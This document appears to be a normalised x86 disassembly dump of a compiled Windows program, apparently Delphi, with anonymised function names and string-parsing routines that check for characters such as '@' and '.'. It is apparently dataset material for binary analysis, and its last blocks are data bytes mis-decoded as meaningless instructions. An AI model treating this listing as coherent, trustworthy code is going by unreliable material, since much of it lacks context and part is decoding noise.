mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4045c8
mov eax [ ebp - 0x8 ]
call sub_4045c8
xor eax eax
push ebp
push sub_4769d9
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_4043d8
test eax eax
jg r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov dl [ edx ]
call sub_404300
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_40471c
test eax eax
jle r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_4043d8
test eax eax
jg r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x1
mov edx 0x1
call sub_404678
mov eax [ ebp - 0x8 ]
call sub_4043d8
mov edx [ ebp - 0x8 ]
mov dl [ edx + eax - 0x1 ]
lea eax [ ebp - 0x10 ]
call sub_404300
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_40471c
test eax eax
jle r-xdata
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_40416c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4769e0
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_40413c
retn
mov eax [ ebp - 0x8 ]
call sub_4043d8
mov edx eax
lea eax [ ebp - 0x8 ]
mov ecx 0x1
call sub_404678
sub_4769e8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_403264
mov edi eax
mov eax esi
call sub_403264
cmp edi eax
je r-xdata
lea eax [ ebx + 0xc ]
mov edx [ esi + 0xc ]
call sub_40416c
lea eax [ ebx + 0x10 ]
mov edx [ esi + 0x10 ]
call sub_40416c
mov edx esi
mov eax ebx
call sub_4192f4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_476a28
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_476c15
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0xc ]
call sub_4043d8
test eax eax
jne r-xdata
mov eax [ esi + 0xc ]
call sub_4043d8
mov ebx eax
cmp ebx 0x1
jl r-xdata
mov eax [ esi + 0x10 ]
call sub_4043d8
test eax eax
jle r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_47683c
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ esi + 0xc ]
cmp [ eax + ebx - 0x1 ] 0x40
jne r-xdata
mov eax edi
call sub_404118
jmp r-xdata
mov eax edi
mov edx r-xdata
call sub_40416c
jmp r-xdata
mov eax [ esi + 0x10 ]
call sub_4043d8
test eax eax
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
dec ebx
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov eax [ esi + 0xc ]
call sub_4043d8
mov ecx eax
mov edx ebx
mov eax [ esi + 0xc ]
call sub_404638
lea eax [ ebp - 0x8 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ esi + 0xc ]
call sub_404638
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476c1c
lea eax [ ebp - 0x18 ]
mov edx 0x6
call sub_40413c
retn
mov eax edi
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_404424
jmp r-xdata
push r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
mov eax edi
mov edx 0x4
call sub_404498
jmp r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4041b0
test ebx ebx
jle r-xdata
push r-xdata
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax edi
mov edx 0x6
call sub_404498
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_404638
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
call sub_4043e0
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov dl [ edx + ebx - 0x1 ]
call sub_404300
mov eax [ ebp - 0x14 ]
mov esi [ rw-data ]
mov esi [ esi ]
mov edx [ rw-data ]
call esi
test eax eax
jle r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
mov dl [ edx + ebx - 0x1 ]
call sub_404300
mov edx [ ebp - 0x18 ]
lea eax [ ebp - 0xc ]
call sub_4043e0
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4043d8
mov ecx eax
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x8 ]
call sub_404638
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_47683c
mov ebx eax
test ebx ebx
jg r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4043e0
sub_476c60
push ebp
mov ebp esp
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_476e91
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x10 ]
call sub_4043d8
test eax eax
jle r-xdata
mov edx edi
mov eax esi
call sub_476a28
lea edx [ ebp - 0xc ]
mov eax [ esi + 0xc ]
call sub_408064
mov eax [ ebp - 0xc ]
mov edx [ esi + 0x10 ]
call sub_404524
je r-xdata
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_47683c
mov ebx eax
test ebx ebx
jle r-xdata
push [ esi + 0x10 ]
push r-xdata
lea edx [ ebp - 0x30 ]
mov eax esi
call sub_476a28
push [ ebp - 0x30 ]
mov eax edi
mov edx 0x3
call sub_404498
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ esi + 0x10 ]
call sub_404638
mov ecx [ ebp - 0x10 ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404424
lea eax [ ebp - 0x14 ]
mov edx [ esi + 0x10 ]
mov dl [ edx + ebx - 0x1 ]
call sub_404300
mov eax [ ebp - 0x14 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov edx [ rw-data ]
call ecx
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476e98
lea eax [ ebp - 0x30 ]
mov edx 0xc
call sub_40413c
retn
lea eax [ ebp - 0x18 ]
mov edx [ esi + 0x10 ]
mov dl [ edx + ebx - 0x1 ]
call sub_404300
mov edx [ ebp - 0x18 ]
lea eax [ ebp - 0x8 ]
call sub_4043e0
lea eax [ ebp - 0x4 ]
push eax
mov eax [ esi + 0x10 ]
call sub_4043d8
mov ecx eax
lea edx [ ebx + 0x1 ]
mov eax [ esi + 0x10 ]
call sub_404638
jmp r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4043e0
mov eax [ ebp - 0x4 ]
call sub_4043d8
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_47683c
mov ebx eax
test ebx ebx
jne r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0x2c ]
mov eax esi
call sub_476a28
push [ ebp - 0x2c ]
mov eax edi
mov edx 0x3
call sub_404498
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404638
mov edx [ ebp - 0x20 ]
lea eax [ ebp - 0x8 ]
call sub_4043e0
lea eax [ ebp - 0x24 ]
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx - 0x1 ]
call sub_404300
mov eax [ ebp - 0x24 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov edx [ rw-data ]
call ecx
test eax eax
jle r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_476a28
push [ ebp - 0x1c ]
mov eax edi
mov edx 0x4
call sub_404498
jmp r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx - 0x1 ]
call sub_404300
mov edx [ ebp - 0x28 ]
lea eax [ ebp - 0x8 ]
call sub_4043e0
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov ecx eax
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x4 ]
call sub_404638
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4043e0
sub_476ed0
push ebp
mov ebp esp
mov ecx 0x11
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4045c8
xor eax eax
push ebp
push sub_477565
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ esi + 0xc ]
call sub_404118
lea eax [ esi + 0x10 ]
call sub_404118
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_408280
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_4041b0
mov eax [ ebp - 0x4 ]
call sub_4043d8
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47756c
lea eax [ ebp - 0x88 ]
mov edx 0x20
call sub_40413c
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_476784
mov ebx eax
test ebx ebx
je r-xdata
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_40416c
xor edi edi
mov [ ebp - 0x5 ] 0x0
mov [ ebp - 0x6 ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x7 ] 0x0
sub eax 0x3c
je r-xdata
je r-xdata
cmp ebx 0x1
jle r-xdata
sub eax 0x2
je r-xdata
cmp [ ebp - 0x6 ] 0x0
je r-xdata
cmp eax 0x22
jg r-xdata
lea edx [ ebp - 0x40 ]
mov eax [ esi + 0x10 ]
call sub_408280
mov edx [ ebp - 0x40 ]
lea ecx [ ebp - 0x3c ]
mov eax r-xdata
call sub_4768f8
mov edx [ ebp - 0x3c ]
lea eax [ esi + 0x10 ]
call sub_40416c
mov [ ebp - 0x6 ] 0x1
mov [ ebp - 0x5 ] 0x1
lea eax [ ebp - 0x4 ]
mov ecx ebx
mov edx 0x1
call sub_404678
jmp r-xdata
lea eax [ ebp - 0x38 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404638
mov edx [ ebp - 0x38 ]
lea eax [ esi + 0x10 ]
call sub_4043e0
mov [ ebp - 0x5 ] 0x0
mov [ ebp - 0x7 ] 0x0
lea eax [ ebp - 0x4c ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404638
mov eax [ ebp - 0x4c ]
lea edx [ ebp - 0x48 ]
call sub_408280
mov edx [ ebp - 0x48 ]
lea ecx [ ebp - 0x44 ]
mov eax r-xdata
call sub_4768f8
mov edx [ ebp - 0x44 ]
lea eax [ esi + 0xc ]
call sub_4043e0
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov ecx eax
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x4 ]
call sub_404638
jmp r-xdata
sub eax 0x2
je r-xdata
lea eax [ ebp - 0x70 ]
push eax
mov ecx ebx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404638
mov edx [ ebp - 0x70 ]
lea eax [ esi + 0xc ]
call sub_4043e0
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov ecx eax
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x4 ]
call sub_404638
jmp r-xdata
push [ esi + 0xc ]
lea eax [ ebp - 0x64 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404638
mov eax [ ebp - 0x64 ]
lea edx [ ebp - 0x60 ]
call sub_408280
mov edx [ ebp - 0x60 ]
lea ecx [ ebp - 0x5c ]
mov eax r-xdata
call sub_4768f8
push [ ebp - 0x5c ]
push r-xdata
lea eax [ esi + 0xc ]
mov edx 0x3
call sub_404498
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov ecx eax
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x4 ]
call sub_404638
mov eax [ ebp - 0x6c ]
lea edx [ ebp - 0x68 ]
call sub_4082d0
mov edx [ ebp - 0x68 ]
lea eax [ ebp - 0x4 ]
call sub_4041b0
jmp r-xdata
sub eax 0x28
je r-xdata
je r-xdata
test edi edi
jle r-xdata
mov [ ebp - 0x7 ] 0x1
cmp [ ebp - 0x5 ] 0x0
je r-xdata
sub eax 0x1c
je r-xdata
inc edi
cmp ebx 0x1
jle r-xdata
dec eax
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
sub eax 0x9
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_476784
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x6 ] 0x0
je r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov ecx ebx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404638
mov edx [ ebp - 0x50 ]
lea eax [ esi + 0xc ]
call sub_4043e0
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov ecx eax
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x4 ]
call sub_404638
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_404678
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
dec edi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov ecx eax
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x4 ]
call sub_404638
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_404678
jmp r-xdata
cmp [ ebp - 0x6 ] 0x0
je r-xdata
cmp ebx 0x1
jne r-xdata
sub eax 0x17
je r-xdata
cmp [ ebp - 0x7 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_476784
mov ebx eax
jmp r-xdata
test ebx ebx
jne r-xdata
mov [ ebp - 0x5 ] 0x1
lea eax [ ebp - 0x58 ]
push eax
mov ecx ebx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404638
mov edx [ ebp - 0x58 ]
lea eax [ esi + 0xc ]
call sub_4043e0
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov ecx eax
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x4 ]
call sub_404638
jmp r-xdata
lea edx [ ebp - 0x54 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov ecx eax
lea edx [ ebx + 0x2 ]
mov eax [ ebp - 0x4 ]
call sub_404638
cmp [ ebp - 0x5 ] 0x0
je r-xdata
cmp edi 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404638
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_408280
mov edx [ ebp - 0x1c ]
lea eax [ esi + 0xc ]
call sub_4043e0
jmp r-xdata
lea eax [ ebp - 0x34 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404638
mov eax [ ebp - 0x34 ]
lea edx [ ebp - 0x30 ]
call sub_408280
mov edx [ ebp - 0x30 ]
lea eax [ esi + 0x10 ]
call sub_4043e0
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404638
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_408280
mov edx [ ebp - 0x28 ]
lea eax [ esi + 0xc ]
call sub_4043e0
jmp r-xdata
cmp [ ebp - 0x7 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_404678
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
cmp [ ebp - 0x6 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + ebx - 0x1 ]
cmp eax 0x2e
jg r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea eax [ ebp - 0x7c ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404638
mov edx [ ebp - 0x7c ]
lea eax [ esi + 0x10 ]
call sub_4043e0
lea eax [ ebp - 0x80 ]
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx ]
call sub_404300
mov edx [ ebp - 0x80 ]
lea eax [ esi + 0x10 ]
call sub_4043e0
lea eax [ ebp - 0x74 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404638
mov edx [ ebp - 0x74 ]
lea eax [ esi + 0xc ]
call sub_4043e0
lea eax [ ebp - 0x78 ]
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx ]
call sub_404300
mov edx [ ebp - 0x78 ]
lea eax [ esi + 0xc ]
call sub_4043e0
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov ecx eax
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x4 ]
call sub_404638
jmp r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404638
mov edx [ ebp - 0x24 ]
lea eax [ esi + 0x10 ]
call sub_4043e0
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov ecx eax
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x4 ]
call sub_404638
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx ebx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404638
mov edx [ ebp - 0x18 ]
lea eax [ esi + 0x10 ]
call sub_4043e0
lea eax [ ebp - 0x14 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404638
mov eax [ ebp - 0x14 ]
lea edx [ ebp - 0x10 ]
call sub_408280
mov edx [ ebp - 0x10 ]
lea eax [ esi + 0xc ]
call sub_4043e0
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_476784
mov ebx eax
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_476784
mov ebx eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_476784
mov ebx eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_476784
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x6 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov ecx eax
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x4 ]
call sub_404638
jmp r-xdata
lea edx [ ebp - 0x88 ]
mov eax [ ebp - 0x4 ]
call sub_408280
mov edx [ ebp - 0x88 ]
lea ecx [ ebp - 0x84 ]
mov eax r-xdata
call sub_4768f8
mov edx [ ebp - 0x84 ]
lea eax [ esi + 0xc ]
call sub_4043e0
jmp r-xdata
sub_4775e8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ r-xdata ]
push eax
xor edx edx
mov eax esi
call sub_419d80
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_477638
push ebp
mov ebp esp
mov ecx 0xd
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4045c8
xor eax eax
push ebp
push sub_477add
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_419994
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_408280
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477ae4
lea eax [ ebp - 0x6c ]
mov edx 0x17
call sub_40413c
lea eax [ ebp - 0xc ]
call sub_404118
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_476784
mov ebx eax
test ebx ebx
jne r-xdata
lea eax [ ebp - 0xc ]
call sub_404118
xor edi edi
mov [ ebp - 0xd ] 0x0
mov eax esi
call sub_4775dc
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4082d0
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_476ed0
jmp r-xdata
sub eax 0x2c
je r-xdata
je r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404638
mov edx [ ebp - 0x3c ]
lea eax [ ebp - 0xc ]
call sub_4043e0
mov eax esi
call sub_4775dc
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_476ed0
lea edx [ ebp - 0x44 ]
mov eax [ ebp - 0x8 ]
call sub_476c60
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x40 ]
call sub_408280
cmp [ ebp - 0x40 ] 0x0
je r-xdata
sub eax 0xe
je r-xdata
dec edi
lea eax [ ebp - 0x34 ]
push eax
mov ecx ebx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404638
mov edx [ ebp - 0x34 ]
lea eax [ ebp - 0xc ]
call sub_4043e0
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov ecx eax
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x4 ]
call sub_404638
jmp r-xdata
sub eax 0x9
je r-xdata
lea eax [ ebp - 0x8 ]
call sub_40d814
lea edx [ ebp - 0x4c ]
mov eax [ ebp - 0x8 ]
call sub_476c60
mov eax [ ebp - 0x4c ]
lea edx [ ebp - 0x48 ]
call sub_408280
mov eax [ ebp - 0x48 ]
mov edx r-xdata
call sub_404524
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov ecx eax
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x4 ]
call sub_404638
lea eax [ ebp - 0xc ]
call sub_404118
jmp r-xdata
dec eax
je r-xdata
test edi edi
jle r-xdata
cmp ebx 0x1
jne r-xdata
sub eax 0x17
je r-xdata
lea eax [ ebp - 0xc ]
call sub_404118
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov ecx eax
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x4 ]
call sub_404638
jmp r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404638
mov edx [ ebp - 0x24 ]
lea eax [ ebp - 0xc ]
call sub_4043e0
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_408280
mov eax [ ebp - 0x28 ]
call sub_4043d8
test eax eax
jle r-xdata
sub eax 0x21
je r-xdata
cmp [ ebp - 0xd ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_476784
mov ebx eax
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
mov ecx ebx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404638
mov edx [ ebp - 0x20 ]
lea eax [ ebp - 0xc ]
call sub_4043e0
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov ecx eax
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x4 ]
call sub_404638
jmp r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx - 0x1 ]
call sub_404300
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0xc ]
call sub_4043e0
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_404678
jmp r-xdata
sub eax 0x2
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov ecx eax
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x4 ]
call sub_404638
jmp r-xdata
mov eax esi
call sub_4775dc
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
call sub_4082d0
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x8 ]
call sub_476ed0
lea eax [ ebp - 0xc ]
call sub_404118
lea eax [ ebp - 0x50 ]
push eax
lea ecx [ ebx + 0x1 ]
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404638
mov edx [ ebp - 0x50 ]
lea eax [ ebp - 0xc ]
call sub_4043e0
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov ecx eax
lea edx [ ebx + 0x2 ]
mov eax [ ebp - 0x4 ]
call sub_404638
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_476784
mov ebx eax
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_476784
mov ebx eax
jmp r-xdata
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x38 ]
push eax
mov ecx ebx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404638
mov edx [ ebp - 0x38 ]
lea eax [ ebp - 0xc ]
call sub_4043e0
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov ecx eax
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x4 ]
call sub_404638
mov al [ ebp - 0xd ]
xor al 0x1
mov [ ebp - 0xd ] al
jmp r-xdata
sub eax 0x6
je r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + ebx - 0x1 ]
cmp eax 0x29
jg r-xdata
lea edx [ ebp - 0x54 ]
mov eax [ ebp - 0xc ]
call sub_408280
mov eax [ ebp - 0x54 ]
call sub_4043d8
test eax eax
jg r-xdata
inc edi
lea eax [ ebp - 0x30 ]
push eax
mov ecx ebx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404638
mov edx [ ebp - 0x30 ]
lea eax [ ebp - 0xc ]
call sub_4043e0
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov ecx eax
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x4 ]
call sub_404638
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4043e0
mov eax esi
call sub_4775dc
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0xc ]
call sub_4082d0
mov edx [ ebp - 0x5c ]
mov eax [ ebp - 0x8 ]
call sub_476ed0
lea edx [ ebp - 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_476c60
mov eax [ ebp - 0x64 ]
lea edx [ ebp - 0x60 ]
call sub_408280
cmp [ ebp - 0x60 ] 0x0
je r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebp - 0x4 ]
call sub_408280
mov eax [ ebp - 0x58 ]
call sub_4043d8
test eax eax
jle r-xdata
lea eax [ ebp - 0x8 ]
call sub_40d814
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x8 ]
call sub_476c60
mov eax [ ebp - 0x6c ]
lea edx [ ebp - 0x68 ]
call sub_408280
mov eax [ ebp - 0x68 ]
mov edx r-xdata
call sub_404524
jne r-xdata
sub_477b17
inc [ edx ]
add [ eax ] al
add [ edx ] ah
pop esp
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_477b65
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477b6c
retn
mov eax rw-data
call sub_404118
mov eax rw-data
call sub_404118
mov eax rw-data
call sub_404118
sub_477b7c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
jl r-xdata
inc ecx
add [ eax - 0x4f ] cl
inc ecx
add [ ecx + esi * 4 + 0x41 ] bh
add [ eax - 0x7bffbe4f ] al
mov cl 0x41
